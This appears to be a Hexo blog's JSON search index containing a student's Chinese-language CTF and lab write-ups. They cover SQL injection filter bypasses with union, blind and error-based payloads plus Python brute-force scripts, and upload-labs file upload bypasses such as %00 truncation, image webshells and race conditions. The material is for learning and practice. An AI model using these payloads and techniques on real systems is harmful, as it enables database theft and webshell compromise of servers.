{"meta":{"title":"Lemon","subtitle":"Never put off until tomorrow what may be done today!","description":"Saying and doing are two different things.","author":"💗zihao","url":"http://bealright.github.io","root":"/"},"pages":[{"title":"","date":"2019-06-07T04:13:59.379Z","updated":"2019-06-07T04:13:59.379Z","comments":true,"path":"404.html","permalink":"http://bealright.github.io/404.html","excerpt":"","text":""},{"title":"categories","date":"2019-06-07T07:43:33.000Z","updated":"2019-06-07T07:43:33.015Z","comments":true,"path":"categories/index.html","permalink":"http://bealright.github.io/categories/index.html","excerpt":"","text":""},{"title":"tags","date":"2014-12-22T04:39:04.000Z","updated":"2019-06-06T14:52:00.335Z","comments":true,"path":"tags/index.html","permalink":"http://bealright.github.io/tags/index.html","excerpt":"","text":""},{"title":"随性洒脱","date":"2019-06-07T07:23:36.000Z","updated":"2019-06-07T08:40:16.975Z","comments":true,"path":"about/index.html","permalink":"http://bealright.github.io/about/index.html","excerpt":"","text":"​ 有时乐观开朗，有时冷漠高冷，I am what I am. ​ 喜欢旅游，去见更大的世界，更广的天空，同样喜欢美食. ​ 对计算机超感兴趣，我会一直努力，不断向前。 ​ （Nothing great was ever achieved without enthusiasm） ​"},{"title":"","date":"2019-06-07T08:31:23.980Z","updated":"2019-06-07T08:31:23.980Z","comments":true,"path":"about/csdn_export_md.html","permalink":"http://bealright.github.io/about/csdn_export_md.html","excerpt":"","text":"有时乐观开朗，有时冷漠高冷，I am what I am 喜欢旅游，去见更大的世界，更广的天空，同样喜欢美食. 对计算机超感兴趣，我会一直努力，不断向前。 （Nothing great was ever achieved without enthusiasm） ​ 如果您愿意请我喝瓶可乐的话，我会更加努力的😄"}],"posts":[{"title":"实验吧——SQL注入 Write up(一)","slug":"实验吧——SQL注入 Write up(一)","date":"2019-08-05T11:22:21.000Z","updated":"2019-08-07T03:31:17.934Z","comments":true,"path":"2019/08/05/实验吧——SQL注入 Write up(一)/","link":"","permalink":"http://bealright.github.io/2019/08/05/实验吧——SQL注入 Write up(一)/","excerpt":"","text":"前言：之前学习过了联合注入查询、布尔盲注、时间盲注等，这次就通过SQL注入题来加强一下。 简单的sql注入方法一输入有回显，且有输入框，那就可以用联合查询的方法来注入 题中提示已经过滤了一些关键字，那么就先来查看题中过滤的是哪些关键字 1?id=1 union select order by # 回显结果：union，select等都被过滤而且没有报错说明#也被过滤可以自己建立一个语句来验证一下如果#没有被过滤，那么上面的语句将会变成这样，语句一定会报错题中将关键字过滤，可以尝试一下双写绕过的方法是否可用输入框中输入?id=1 unionunion selectselect，发现空格也被过滤了但双写绕过的方法是可行的，可以采用这个方法 判断注入点可以采用&#39;=&#39;或1&#39; or &#39;1&#39;=&#39;1查看是否有注入点SQL注入——注入点判断 判断闭合符号 发现输入框中输入1&#39;时语句报错，由于这道题将注释符号给过滤了，那就用&#39;来闭合后面的单引号，这样来测试是否&#39;为闭合符号，可以自己建立sql语句来更详细的了解一下在输入框中输入1 &#39; &#39;,发现回显正常，说明&#39;即为闭合符号接下来就是联合注入的一系列步骤了 判断列数 当判断是否有注入点的时候，发现只有name，而我们输入的ID则一直不变，因此猜测列数只有一列 查询数据表 题中已经将注释符给过滤掉了，但是在上面已经知道了&#39;是闭合符号，那就可以用and &#39;1&#39;=&#39;1来闭合后面的单引号 1?id=1' union select group_concat(table_name) from information_schema.tables where table_schema=database() and '1'='1 其他都被过滤了，构造双写绕过，前面也说了空格也被过滤了，但是也可以用两个空格来绕过过滤 输入 1?id=1' unionunion selectselect group_concatgroup_concat(table_name) fromfrom information_schema.tables wherewhere table_schematable_schema=database() andand '1'='1 发现table_schematable_schema被强制换掉了，那么就用table_schemtable_schemaa这种形式来绕过，过滤中间的，前后再拼接成table_schematable_schema payload：1?id=1' unionunion selectselect group_concatgroup_concat(table_name) fromfrom information_schema.tables wherewhere table_schemtable_schemaa=database() andand '1'='1 有一个表名为flag，flag应该就在里面 查字段 payload：1?id=1'unionunion selectselect group_concatgroup_concat(column_namcolumn_namee) fromfrom information_schema.columinformation_schema.columnsns wherewhere table_name='flag 这里column_name也采用错位的方法来绕过，但估计是系统原因吧，莫名奇妙崩了看了其他大师傅的博客，知道flag是其中的一个字段，就构造语句查询结果 查值 payload：1?id=1'unionunion selectselect flag fromfrom flag wherewhere '1'='1 得出结果 方法二一道题肯定是不只一种解法的，再来看看另一种方法输入1?id=1 unionunion and selectselect 发现回显很奇怪，如果是过滤关键字了，为什么还有关键字，尝试几次就会发现关键字过滤实际上是过滤后面带有一个空格的关键字，那就又出现了一个思路，只需将空格绕过即可 常见的空格绕过有这些 1+、%0a、%0b、/**/ 查询数据库 1?id=1' union/**/select/**/database()' 1?id=1' union%0aselect%0adatabase()' 1?id=1' union%0bselect%0bdatabase()' 三种均能够查出数据库 查数据表 1?id=1' union/**/select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schemtable_schemaa='web1 同样table_schema需要错位来进行绕过查字段 1?id=1'union/**/select/**/group_concat(column_namcolumn_namee)/**/from/**/information_schema.information_schema.columnscolumns/**/where/**/table_name='flag 还是那个问题，不管它，反正语句正确 查值 1?id=1' union/**/select/**/flag/**/from/**/flag/**/where/**/'1'='1 简单的sql注入之2输入1?id=1' and length(database())&gt;1 --+ 回显结果为：第一反应用时间盲注试试 1?id=1' and if(length(database())&gt;5,1,sleep(5)) --+ 回显结果： 那就换一种思路，用布尔盲注测试 1?id=1' and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))&gt;200 --+ 故意将ASCII值调大，看是否还出现SQLi detected! 回显结果还是出现 那就换手工注入，观察到底过滤了什么输入?id=&#39;=&#39;得出列数为一列测试闭合符号输入 1?id=1' 报错输入 1?id=1' ' 还是报错 但是输入 1?id=1'' 回显正常说明这里把空格给过滤了，可以再输入一些其他的来验证一下输入 1?id=1' and '1'='1 回显错误输入 1?id=1'and'1'='1 回显正确，果然是过滤了空格，在sql注入之一，通过/**/来绕过空格，这次就再用一次 查数据库 1?id=1'union/**/select/**/database()/**/' 查数据表 1?id=1'union/**/select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema='web1 查字段 1?id=1'union/**/select/**/group_concat(column_namcolumn_namee)/**/from/**/information_schema.columns/**/where/**/table_name='flag 这次竟然显示了，然而没高兴过一秒就又不行了查值 1?id=1'/**/union/**/select/**/flag/**/from/**/flag/**/where/**/'1'='1 简单的sql注入之3方法一、布尔盲注一开始做没注意提示是报错提示，就用布尔盲注去尝试，结果还是可以做的 闭合符号还是&#39;，这里就不再演示了 正常输入的话回显为：那就构造一下布尔盲注查数据表的语句看是否可行 1?id=1' and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))&gt;1 --+ 回显正常，说明可以进行布尔盲注 可以手工注入，也可以写脚本跑出来，这里就写脚本跑出来 猜解长度12345678910111213141516171819import requestsdef len(): for i in range(1,5): url = '''http://ctf5.shiyanbar.com/web/index_3.php''' #猜表名长度 payload = '''?id=1' and length(database())&gt;%s''' %i #猜字段长度 #payload = '''?id=1' and (select length(table_name) from information_schema.tables where table_schema=database() limit 0,1)&gt;%s ''' %i #猜值长度 #payload = '''?id=1' and (select length(column_name) from information_schema.columns where table_name ='flag' limit 0,1)&gt;%s''' # print(url+payload+'%23') r = requests.get(url+payload+'%23') if 'Hello!' in r.text: print(i) else: #print('false') print('database_length:',i)len() 猜解数据 1234567891011121314151617181920212223242526import requestsdef get_value(): name = '' #根据猜解的长度进行改变 for j in range(1,5): for i in '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&#123;&#125;_@!': #爆出表名 url = \"http://ctf5.shiyanbar.com/web/index_3.php?id=1' and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),%d,1)))=ord('%s')\" %(j,i) #爆出列名 #url = \"http://ctf5.shiyanbar.com/web/index_3.php?id=1' and (ascii(substr((select column_name from information_schema.columns where table_name='flag' limit 1,1),%d,1)))=ord('%s')\" %(j,i) #爆值 #url = \"http://ctf5.shiyanbar.com/web/index_3.php?id=1' and (ascii(substr(( select flag from flag limit 0,1),%d,1)))=ord('%s')\"%(j,i) # print(url+'%23') r = requests.get(url+'%23') if 'Hello!' in r.text: name = name+i print(name) break print('value:',name)get_value() 但是在猜解字段长度和猜解字段的时候又出现这个问题 就不管这个问题，之前一直以为脚本中的payload又错误，结果是服务器有错误，所以无法跑出列名，查看大师父们的博客，发现列名还是flag，好吧，继续跑值 由于脚本中range的长度是1-5，所以只能跑出就将range的范围改的大一些，改为1-30因为python还不太熟练，所以写的脚本还比较菜，继续努力学习写脚本吧 方法二、报错注入不过这样就结束了？，我还一直在疑惑，这题道将哪些东西给过滤了，结果提交的时候发现报错注入，那就再用报错注入来做一遍 用常用的语句尝试一下 1?id=2' select count(*) from information_schema.columns group by concat(database(),0x3a,floor(rand(0)*2));--+ 回显结果为：说明floor函数已经被过滤了，查一下报错注入常用的其他函数十种MySQL报错注入updatexml报错注入SQL注入之报错注入的一些随笔 12345678910floor()extractvalue()updatexml()geometrycollection()multipoint()polygon()multipolygon()linestring()multilinestring()exp() updatexml () 函数1?id=1' and updatexml(1,concat(0x7e,(select distinct concat(0x7e, (select schema_name),0x7e) from admin limit 0,1),0x7e),1)--+ extractvalue()报错 1?id=1' and extractvalue(1,concat(0x7e,(select database()),0x7e))--+ updatexml()报错注入 1?id=1' and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+ exp()报错注入 1?id=1' union select (exp(~(select * FROM(SELECT USER())a)))--+ 终于让找到没有被过滤的函数了查数据表1?id='or exp(~(Select * From (select group_concat(table_name) from information_schema.tables where table_schema=database())x)) %23 这就没意思了吧。。。。都不能用，算了就顺便总结一下payload，方便以后用exp()报错注入 查数据库 1?id='or exp(~(Select * From (select database())x)) %23 查数据表 1?id='or exp(~(Select * From (select group_concat(table_name) from information_schema.tables where table_schema=database())x)) %23 查字段 1?id='or exp(~(Select * From (select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='flag')x)) %23 查值 1?id='or exp(~(Select * From (select flag from flag)x)) %23 附上大师傅博客，向大师傅学习V0W 原本想用sqlmap工具来做，谁知道虚拟机崩了，没法打开，最近可真倒霉，phpstudy崩完，虚拟机崩，唉（还要再去解决虚拟机的问题） 累啊 感悟：一道题不只一种解法，多尝试其他方法拓宽自己的思路，最近也比较烦躁，总觉得做题没意思，不会了只会看大师傅的writeUp，一做题就懵逼，做一道题可能就用一上午，不过那这也是正常的，还是得耐心点，不是为了做题而做题，切记不要浮躁, 继续努力，有困难就解决！","categories":[{"name":"web","slug":"web","permalink":"http://bealright.github.io/categories/web/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://bealright.github.io/tags/CTF/"}]},{"title":"文件上传漏洞——upload-labs(11-20)","slug":"文件上传漏洞——upload-labs(11-20)","date":"2019-08-03T12:01:24.000Z","updated":"2019-08-07T09:44:05.057Z","comments":true,"path":"2019/08/03/文件上传漏洞——upload-labs(11-20)/","link":"","permalink":"http://bealright.github.io/2019/08/03/文件上传漏洞——upload-labs(11-20)/","excerpt":"","text":"前言：上次文件上传漏洞学习到第十关，这次继续学习 第十一关分析源码前面几行代码都是对后缀名进行限制，最重要的就是这一句代码 1$img_path = $_GET['save_path'].\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_ext; 发现save_path用户是可控的，那么就利用%00截断来绕过 在此之前，先来了解一下截断上传的原理 在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束，而忽略后面上传的文件或图片，只上传截断前的文件或图片 可以通过一个例子详解的了解一下 12345&lt;% path=\"upload/web/\" file=\"1.jpg\" upfilename=path &amp; file '最后的上传地址 %&gt; 将路径改为path=&quot;upload/web/1.php%00&quot;,那么拼接之后，文件上传时就变成了&quot;upload/web/1.php%001.jpg&quot;，这时上传便将1.php上传进去，而1.jpg则被截断，我理解的就是相对于省略符号，将后面的内容给省略了，相当于MySQL注入语句中的#、--+等 下面就来做题，几乎是一模一样上传成功 不过在上传时我才明白，原来截断了1 .jpg，但是1.jpg的内容是被1.php给继承过去了，我还一直认为是必须自己创建1.php, 里面包含内容那。。。，这次真的学习到了 方法：%00截断 附上大师傅们的博客截断上传原理剖析00截断原理分析 差点忘记了最重要的一条，要进行配置才能进行%00绕过 截断条件： php版本要小于5.3.4 magic_quotes_gpc需要为Off状态 找到并修改即可 第十二关分析源码和十一关的代码基本相同，但是有一个点是不同的$_POST[&#39;save_path&#39;]，save_path是通过post传进来的，只是传进来的方式不同，绕过的方法应该还是%00截断 但是这次不能直接抓包在后面加上%00，因为post不会像get一样对%00进行自动解码，所以得换另一种方法进行%00绕过，查看大师傅的做法才知道要在二进制中进行修改 将70 68 70后面的2b改为00即可绕过 上传成功方法：%00截断 第十三关 那就先来做图片木马 输入命令1copy 1.jpg /b + 1.php /a shell.jpg 一句话木马确实已经插入 接下来就结合文件包含漏洞将图片中的php文件进行解析 upload-labs自带有文件包含漏洞 1http://127.0.0.1/upload/include.php?file=upload/2020190806155326.jpg 解析成功 分析一下源码 12345678910111213141516171819202122232425262728293031323334353637383940function getReailFileType($filename)&#123; $file = fopen($filename, \"rb\");//fopen() 函数打开文件或者 URL，\"r\" 只读方式打开，将文件指针指向文件头 $bin = fread($file, 2); //只读2字节 fclose($file); $strInfo = @unpack(\"C2chars\", $bin); $typeCode = intval($strInfo['chars1'].$strInfo['chars2']); $fileType = ''; switch($typeCode)&#123; case 255216: $fileType = 'jpg'; break; case 13780: $fileType = 'png'; break; case 7173: $fileType = 'gif'; break; default: $fileType = 'unknown'; &#125; return $fileType;&#125;$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $file_type = getReailFileType($temp_file); if($file_type == 'unknown')&#123; $msg = \"文件未知，上传失败！\"; &#125;else&#123; $img_path = UPLOAD_PATH.\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_type; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = \"上传出错！\"; &#125; &#125;&#125; 可以看出做出限制的是这一段代码 1$bin = fread($file, 2); //只读2字节 通过读文件的前2个字节判断文件类型,没有其他防护，所以可以上传图片马解析即可 第十四关用十三关的图片马一样可以解析分析一下源码 12345678910111213141516171819202122232425262728293031function isImage($filename)&#123; $types = '.jpeg|.png|.gif'; if(file_exists($filename))&#123; $info = getimagesize($filename);//getimagesize() 函数用于获取图像大小及相关信息 $ext = image_type_to_extension($info[2]);//image_type_to_extension — 根据指定的图像类型返回对应的后缀名。 if(stripos($types,$ext)&gt;=0)&#123; return $ext; &#125;else&#123; return false; &#125; &#125;else&#123; return false; &#125;&#125;$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $res = isImage($temp_file); if(!$res)&#123; $msg = \"文件未知，上传失败！\"; &#125;else&#123; $img_path = UPLOAD_PATH.\"/\".rand(10, 99).date(\"YmdHis\").$res; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = \"上传出错！\"; &#125; &#125;&#125; 进行限制的是这两段代码 12$info = getimagesize($filename);$ext = image_type_to_extension($info[2]); 通过使用getimagesize()检查是否为图片文件，所以还是可以用第十三关的图片马绕过 第十五关查看一下源码 1234567891011121314151617181920212223242526272829303132333435function isImage($filename)&#123; //需要开启php_exif模块 $image_type = exif_imagetype($filename); switch ($image_type) &#123; case IMAGETYPE_GIF: return \"gif\"; break; case IMAGETYPE_JPEG: return \"jpg\"; break; case IMAGETYPE_PNG: return \"png\"; break; default: return false; break; &#125;&#125;$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $res = isImage($temp_file); if(!$res)&#123; $msg = \"文件未知，上传失败！\"; &#125;else&#123; $img_path = UPLOAD_PATH.\"/\".rand(10, 99).date(\"YmdHis\").\".\".$res; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = \"上传出错！\"; &#125; &#125;&#125; 做出限制的代码为： 1$image_type = exif_imagetype($filename); exif_imagetype函数获取图片类型，使用exif_imagetype()检查是否为图片文件，所以还是可以用第十关的方法，这几关可以了解一些获取图片类型的函数 第十六关如果还使用第十三关的图片马，发现其中的PHP代码没有解析出来，分析一下源码，看下源码都做出了那些限制 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384$is_upload = false;$msg = null;if (isset($_POST['submit']))&#123; // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径 $filename = $_FILES['upload_file']['name']; $filetype = $_FILES['upload_file']['type']; $tmpname = $_FILES['upload_file']['tmp_name']; $target_path=UPLOAD_PATH.'/'.basename($filename); // 获得上传文件的扩展名 $fileext= substr(strrchr($filename,\".\"),1); //判断文件后缀与类型，合法才进行上传操作 if(($fileext == \"jpg\") &amp;&amp; ($filetype==\"image/jpeg\"))&#123; if(move_uploaded_file($tmpname,$target_path))&#123; //使用上传的图片生成新的图片 $im = imagecreatefromjpeg($target_path);//imagecreatefromjpeg()：创建一块画布，并从 JPEG 文件或 URL 地址载入一副图像 if($im == false)&#123; $msg = \"该文件不是jpg格式的图片！\"; @unlink($target_path); &#125;else&#123; //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).\".jpg\"; //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.'/'.$newfilename; imagejpeg($im,$img_path); @unlink($target_path); $is_upload = true; &#125; &#125; else &#123; $msg = \"上传出错！\"; &#125; &#125;else if(($fileext == \"png\") &amp;&amp; ($filetype==\"image/png\"))&#123; if(move_uploaded_file($tmpname,$target_path))&#123; //使用上传的图片生成新的图片 $im = imagecreatefrompng($target_path); if($im == false)&#123; $msg = \"该文件不是png格式的图片！\"; @unlink($target_path); &#125;else&#123; //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).\".png\"; //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.'/'.$newfilename; imagepng($im,$img_path); @unlink($target_path); $is_upload = true; &#125; &#125; else &#123; $msg = \"上传出错！\"; &#125; &#125;else if(($fileext == \"gif\") &amp;&amp; ($filetype==\"image/gif\"))&#123; if(move_uploaded_file($tmpname,$target_path))&#123; //使用上传的图片生成新的图片 $im = imagecreatefromgif($target_path); if($im == false)&#123; $msg = \"该文件不是gif格式的图片！\"; @unlink($target_path); &#125;else&#123; //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).\".gif\"; //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.'/'.$newfilename; imagegif($im,$img_path); @unlink($target_path); $is_upload = true; &#125; &#125; else &#123; $msg = \"上传出错！\"; &#125; &#125;else&#123; $msg = \"只允许上传后缀为.jpg|.png|.gif的图片文件！\"; &#125;&#125; 先来了解一下代码中出现的一些函数 123456imagecreatefromgif()：创建一块画布，并从 GIF 文件或 URL 地址载入一副图像imagecreatefromjpeg()：创建一块画布，并从 JPEG 文件或 URL 地址载入一副图像imagecreatefrompng()：创建一块画布，并从 PNG 文件或 URL 地址载入一副图像imagecreatefromwbmp()：创建一块画布，并从 WBMP 文件或 URL 地址载入一副图像imagecreatefromstring()：创建一块画布，并从字符串中的图像流新建一副图像move_uploaded_file() 函数将上传的文件移动到新位置。 上面的代码判断了文件后缀和content-type，而且后面的代码又考察了二次渲染看了很多大师傅们的博客，都说这道题考查的是图像的二次渲染，但同时这段代码是存在逻辑漏洞的 1if(move_uploaded_file($tmpname,$target_path)) 用move_uploaded_file（）作if条件做判断时，如果返回true，上传的文件不管是否符号要求，到可以上传到服务器，不过这里主要考察的是二次渲染，接下来就用最简便的GIF图片来绕过二次渲染 上传GIF图片马上传发现没有解析成功，将上传的图片下载下来，用winhex打开观察一下经过二次渲染，发现文件名已经改变而且末尾的PHP代码已经被去除，既然后面插入不了那就对比一些上传前和上传后的图片，看看那些部分是没有改变的，将一句话插入其中经过对比，这一段都是相同的，可以将代码插入其中，发现上传后的图片依然有PHP代码，上传成功还有JPEG和PNG图片上传，但是都需要脚本，这里就暂时先不用这两种方法了，不过可以参考大师傅的博客，upload-labs之pass 16详细分析 方法： 图片对比，在winhex将代码插入到相同的部位进行绕过 第十七关提示：需要代码审计！ 那就来分析代码 123456789101112131415161718192021222324$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $ext_arr = array('jpg','png','gif'); $file_name = $_FILES['upload_file']['name']; $temp_file = $_FILES['upload_file']['tmp_name']; $file_ext = substr($file_name,strrpos($file_name,\".\")+1); $upload_file = UPLOAD_PATH . '/' . $file_name;//in_array() 函数搜索数组中是否存在指定的值。//rename() 函数重命名文件或目录。 if(move_uploaded_file($temp_file, $upload_file))&#123; if(in_array($file_ext,$ext_arr))&#123; $img_path = UPLOAD_PATH . '/'. rand(10, 99).date(\"YmdHis\").\".\".$file_ext; rename($upload_file, $img_path); $is_upload = true; &#125;else&#123; $msg = \"只允许上传.jpg|.png|.gif类型文件！\"; unlink($upload_file); &#125; &#125;else&#123; $msg = '上传出错！'; &#125;&#125; 12345if(move_uploaded_file($temp_file, $upload_file))&#123; if(in_array($file_ext,$ext_arr))&#123; $img_path = UPLOAD_PATH . '/'. rand(10, 99).date(\"YmdHis\").\".\".$file_ext; rename($upload_file, $img_path); $is_upload = true; 这一段代码先将文件上传到服务器，再判断后缀名，如果合法则保留下来，如果不合法，后面这段代码则起删除作用，删除在服务器的文件 12$msg = \"只允许上传.jpg|.png|.gif类型文件！\"; unlink($upload_file); unlink() 函数删除文件 所以根据这个流程，可以通过条件竞争的方式在unlink()函数删除之前，访问上传文件，在此之前先来了解一下条件竞争 条件竞争漏洞是一种服务器端的漏洞，由于服务器端在处理不同用户的请求时是并发进行的，因此，如果并发处理不当或相关操作逻辑顺序设计的不合理时，将会导致此类问题的发生。 接下来就利用条件竞争删除文件的时间差绕过 在burp中不断发送上传webshell的数据包，然后不断在浏览器中访问，发现通过竞争可以访问到，设置多线程控制攻击请求的并发数，但是我的burp有问题，无法设置多线程，所以没有办法复现出来 方法：条件竞争 第十八关随便上传图片马，发现审计一下代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118//index.php$is_upload = false;$msg = null;if (isset($_POST['submit']))&#123; require_once(\"./myupload.php\"); $imgFileName =time(); $u = new MyUpload($_FILES['upload_file']['name'], $_FILES['upload_file']['tmp_name'], $_FILES['upload_file']['size'],$imgFileName); $status_code = $u-&gt;upload(UPLOAD_PATH); switch ($status_code) &#123; case 1: $is_upload = true; $img_path = $u-&gt;cls_upload_dir . $u-&gt;cls_file_rename_to; break; case 2: $msg = '文件已经被上传，但没有重命名。'; break; case -1: $msg = '这个文件不能上传到服务器的临时文件存储目录。'; break; case -2: $msg = '上传失败，上传目录不可写。'; break; case -3: $msg = '上传失败，无法上传该类型文件。'; break; case -4: $msg = '上传失败，上传的文件过大。'; break; case -5: $msg = '上传失败，服务器已经存在相同名称文件。'; break; case -6: $msg = '文件无法上传，文件不能复制到目标目录。'; break; default: $msg = '未知错误！'; break; &#125;&#125;//myupload.phpclass MyUpload&#123;.................. var $cls_arr_ext_accepted = array( \".doc\", \".xls\", \".txt\", \".pdf\", \".gif\", \".jpg\", \".zip\", \".rar\", \".7z\",\".ppt\", \".html\", \".xml\", \".tiff\", \".jpeg\", \".png\" );.................. /** upload() ** ** Method to upload the file. ** This is the only method to call outside the class. ** @para String name of directory we upload to ** @returns void **/ function upload( $dir )&#123; $ret = $this-&gt;isUploadedFile(); if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; $ret = $this-&gt;setDir( $dir ); if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; $ret = $this-&gt;checkExtension(); if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; $ret = $this-&gt;checkSize(); if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; // if flag to check if the file exists is set to 1 if( $this-&gt;cls_file_exists == 1 )&#123; $ret = $this-&gt;checkFileExists(); if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; &#125; // if we are here, we are ready to move the file to destination $ret = $this-&gt;move(); if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; // check if we need to rename the file if( $this-&gt;cls_rename_file == 1 )&#123; $ret = $this-&gt;renameFile(); if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; &#125; // if we are here, everything worked as planned :) return $this-&gt;resultUpload( \"SUCCESS\" ); &#125;.................. &#125;; 先是 $ret = $this-&gt;move();，进行了一次文件保存，然后再 $ret = $this-&gt;renameFile();，进行了一次更改文件名，所以可以用条件竞争来进行绕过 方法：条件竞争 第十九关发现和之前有些不一样查看一下源码 12345678910111213141516171819202122232425$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\"php\",\"php5\",\"php4\",\"php3\",\"php2\",\"html\",\"htm\",\"phtml\",\"pht\",\"jsp\",\"jspa\",\"jspx\",\"jsw\",\"jsv\",\"jspf\",\"jtml\",\"asp\",\"aspx\",\"asa\",\"asax\",\"ascx\",\"ashx\",\"asmx\",\"cer\",\"swf\",\"htaccess\"); $file_name = $_POST['save_name']; $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);//pathinfo() 函数以数组的形式返回文件路径的信息。 if(!in_array($file_ext,$deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH . '/' .$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125;else&#123; $msg = '上传出错！'; &#125; &#125;else&#123; $msg = '禁止保存为该类型文件！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125; 查看大师傅的博客，发现move_uploaded_file会忽略掉文件末尾的/.而且文件名是从$_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]中获取的，所以用户是可以进行控制的，所以通过/. 来进行绕过 上传成功除此之外那也可以用用move_uploaded_file函数的00截断漏洞绕过 第二十关来源一道CTF题，需要审计代码，目前自己还审计不了，就参考大师傅们的，暂时先留到这，等水平提高了，再回头看这道题 总结：通过upload-labs又学习到了很多很好玩的知识，接下来学习又关密码学的知识，少年，继续加油！ 参考博客：Upload-labs 20关通关笔记Upload-labs通关手册","categories":[{"name":"web","slug":"web","permalink":"http://bealright.github.io/categories/web/"}],"tags":[{"name":"文件上传","slug":"文件上传","permalink":"http://bealright.github.io/tags/文件上传/"}]},{"title":"文件上传漏洞——upload-labs(1-10)","slug":"文件上传漏洞——upload-labs(1-10)","date":"2019-08-01T12:01:24.000Z","updated":"2019-08-07T07:41:44.196Z","comments":true,"path":"2019/08/01/文件上传漏洞——upload-labs(1-10)/","link":"","permalink":"http://bealright.github.io/2019/08/01/文件上传漏洞——upload-labs(1-10)/","excerpt":"","text":"前言：文件上传漏洞有很多种绕过技巧，这次就通过upload-labs进行学习 第一关上传有限制，只让上传JPEG或PNG格式的图片，就先尝试一下抓包修改上传格式的方法看看是否可行 先将一句话木马PHP文件后缀名改为PNG格式，上传拦截抓包 拦截请求包后，将1.png改为1.php，再发包，用菜刀进行连接，在此之前需要知道上传的文件上传到哪个目录下，查看源码查出图片上传路径路径也知道了，就用菜刀进行连接连接成功观察一下第一关的源码1234567891011121314151617function checkFile() &#123; var file = document.getElementsByName('upload_file')[0].value; if (file == null || file == \"\") &#123; alert(\"请选择要上传的文件!\"); return false; &#125; //定义允许上传的文件类型 var allow_ext = \".jpg|.png|.gif\"; //提取上传文件的类型 var ext_name = file.substring(file.lastIndexOf(\".\")); //判断上传文件类型是否允许上传 if (allow_ext.indexOf(ext_name + \"|\") == -1) &#123; var errMsg = \"该文件不允许上传，请上传\" + allow_ext + \"类型的文件,当前文件类型为：\" + ext_name; alert(errMsg); return false; &#125;&#125; 通过观察只是限制了在上传时的类型，所以中途拦截抓包改格式的方法是完成可行的。 方法：改包绕过上传 第二关做第二关时发现沿用第一关的方法也是可行的，不过应该不会再考同一个点了 就查看一下源码 12345678910111213141516171819$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH . '/' . $_FILES['upload_file']['name'] if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '文件类型不正确，请重新上传！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH.'文件夹不存在,请手工创建！'; &#125;&#125; 发现这一段代码判断content-type,那就可以通过修改content-type进行绕过： 1if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) 抓包将application/octet-stream修改为image/png或image/gif都可以连接成功方法：修改content-type进行绕过 第三关上传PHP文件时，发现有这样的提示应该是源码中限制了这些文件的后缀名，查看大师傅们的博客发现还可以用1phtml，php3，php4, php5, pht 这些后缀名进行绕过，就来尝试一下，发现连接不上去，查了一下才知道原来前提是apache的httpd.conf中有如下配置代码1AddType application/x-httpd-php .php .phtml .phps .php5 .pht 